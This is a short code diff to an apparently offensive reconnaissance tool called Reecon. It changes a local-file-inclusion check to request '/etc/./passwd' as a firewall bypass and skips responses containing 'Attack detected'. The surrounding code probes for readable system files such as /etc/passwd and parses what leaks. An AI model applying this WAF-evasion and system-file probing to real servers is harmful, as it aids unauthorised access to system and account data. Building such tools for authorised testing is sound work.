@@ -190,7 +190,7 @@ namespace Reecon
             // Linux
             List<string> linuxChecks = new()
             {
-                "/etc/passwd",
+                "/etc/./passwd", // The . is intentional - It's a mini firewall bypass
                 "/etc/resolv.conf",
                 "/var/www/index.php",
                 "/var/www/html/index.php",
@@ -412,7 +412,9 @@ namespace Reecon
                 int resultLength = result.Length;
                 if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + bypassLength)
                     && resultLength != notFoundLength2 && resultLength != (notFoundLength2 + check.Length + bypassLength)
-                    && !result.Contains("failed to open stream"))
+                    && !result.Contains("failed to open stream")
+                    && !result.Contains("Attack detected") // Firewall
+                    )
                 {
                     Console.WriteLine("- " + fullPath + " (Len: " + resultLength + ")");
                     ParseUsefulEntries(check, result);
@@ -430,7 +432,7 @@ namespace Reecon
 
         private static void ParseUsefulEntries(string check, string pageText)
         {
-            if (check == "/etc/passwd")
+            if (check == "/etc/./passwd")
             {
                 if (pageText.Contains("root:x:0:0:root:/root"))
                 {
